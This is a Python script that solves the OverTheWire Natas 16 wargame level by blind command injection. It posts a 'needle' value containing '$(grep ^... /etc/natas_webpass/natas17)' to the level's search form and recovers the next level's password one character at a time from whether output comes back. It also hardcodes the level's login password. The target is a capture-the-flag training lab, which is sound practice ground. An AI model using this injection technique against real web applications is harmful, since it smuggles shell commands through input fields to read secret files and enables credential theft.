import requests
import re
from html import unescape
from string import *

characters = ascii_lowercase + ascii_uppercase + digits

username = 'natas16'
password = 'TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V'

url = 'http://%s.natas.labs.overthewire.org/index.php' % username
# url = 'http://%s.natas.labs.overthewire.org/index-source.html' % username

# List of password has been founded
seen_password = list()

with open('natas16.html', 'w+') as out:
    session = requests.Session()
    while (len(seen_password) < 32):
        for ch in characters:
            print('trying character with password',
                  "".join(seen_password) + ch)
            # res = session.post(url, auth=(username, password), data={
            #                    "needle": "anythings$(grep ^" + ch + " /etc/natas_webpass/natas17)"})
            # content = res.text
            # returned = re.findall('<pre>\n(.*)\n</pre>', content)
            # finding first character in the password
            # if (returned):
            #     print('{}, this character is not the first character'.format(ch))
            # else:
            #     print('%s, THIS IS THE FIRST CHARACTER!!!' % ch)
            #     exit()

            res = session.post(url, auth=(username, password), data={
                               "needle": "anythings$(grep ^" + "".join(seen_password) + ch + " /etc/natas_webpass/natas17)"})
            content = res.text
            returned = re.findall('<pre>\n(.*)\n</pre>', content)
            if (not returned):
                seen_password.append(ch)
                break
